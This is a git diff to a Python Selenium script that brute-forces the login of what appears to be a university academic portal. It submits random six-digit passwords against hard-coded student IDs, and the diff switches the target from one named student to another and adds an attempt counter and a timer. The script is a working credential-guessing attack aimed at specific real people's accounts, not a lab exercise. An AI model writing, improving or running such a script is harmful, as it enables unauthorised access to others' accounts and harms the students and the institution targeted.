@@ -1,4 +1,5 @@
 from random import randint
+import time
 from logging import error
 from selenium import webdriver
 from selenium.webdriver.support.ui import WebDriverWait
@@ -26,6 +27,8 @@ def generate():
     return '{:06d}'.format(randint(0,999999))
 
 if __name__ == '__main__':
+    st = time.localtime(time.time())
+    i = 1
     # chromedriver path
     driverpath = '/home/irfancr/Practices/rizkitawar/chromedriver'
     # initialize the Chrome driver
@@ -34,20 +37,27 @@ if __name__ == '__main__':
     
     while(True):
         # Akademik credentials
-        # Rizkita pass
-        username = "19105010041"
+        # bril user
+        username = "18105010022"
+        # Rizkita user
+        # username = "19105010041"
         password = generate()
         # if we find that error message within errors, then login is failed
         errors = brute(username, password, driver)
 
         # print(errors)
         # print([error.text for error in errors])
-        print("{}: {}".format(username, password))
+        print("[{}] {}: {}".format(i, username, password))
 
         if any(e.text in error_message for e in errors):
-            print("[!] Login failed", end='\n\n')
+            print("[!] Login failed")
         else:
             print("[+] Login successful")
             break
+
+        end = time.localtime(time.time())
+        hour, minute, sec = end.tm_hour - st.tm_hour, end.tm_min - st.tm_min, end.tm_sec - st.tm_sec
+        print('{}:{}:{}'.format(hour, minute, sec), end='\n\n')
+        i += 1
     # close the driver
     driver.close()
